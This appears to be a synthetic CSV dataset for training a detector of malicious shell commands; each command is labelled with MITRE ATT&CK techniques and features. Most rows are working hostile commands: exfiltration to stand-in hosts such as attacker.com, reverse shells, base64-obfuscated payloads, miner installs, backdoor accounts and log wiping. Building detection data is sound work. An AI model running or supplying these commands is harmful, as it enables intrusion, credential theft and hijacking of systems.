"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'  &&  chmod  +x  /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup wget --post-file=/etc/passwd http://attacker.com/receive | sleep 1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"time python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo cat /etc/network/interfaces,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""passwd -d root | sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""find / -writable -type d 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""nmap -A -T4 192.168.1.0/24 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo '' > /var/log/syslog && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ssh user@192.168.1.10 'ls' &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
cat  /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl  -s  http://c2.attacker.com/beacon  ;  chmod  +x  /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""powershell.exe -EncodedCommand JABzA... && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup powershell.exe -EncodedCommand JABzA... && chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ | sleep 1""","[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"sudo nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZmluZCAvIC1uYW1lICdpZF9yc2EnIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
passwd -d root | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'cHJvY2R1bXAuZXhlIC1tYSBsc2Fzcy5leGUgbHNhc3MuZG1w' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIHwgZWNobyBkb25l'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo  'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJzICYmIHNsZWVwIDE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
net localgroup administrators | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget http://attacker.com/payload -O /tmp/payload &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ssh -L 8080:internal:80 user@jump.host | echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
usermod  -aG  sudo  compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup ./pwnkit ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""sh -c 'curl http://evil.com/shell.sh | bash'""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate  wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ip link show && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'Z3JvdXBz' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwgJiYgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
crontab  -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash | echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow ; > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""id -u && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'  &&  echo  done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ifconfig -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit.py --target localhost ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3cgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIicgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/shadow && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /add attacker P@ssw0rd && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""python3 -c 'print(1+1)'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
time masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""smbclient //10.0.0.5/C$ -U Administrator""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
id  -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
useradd -m -s /bin/bash hacker ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3  exploit.py  --target  localhost  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443 &,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ifconfig -a ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'Y2F0IC9ldGMvZ3JvdXAgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nbtscan 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh  &&  echo  done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
last -n 10 && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
sudo psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
sed  -i  's/old/new/g'  config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
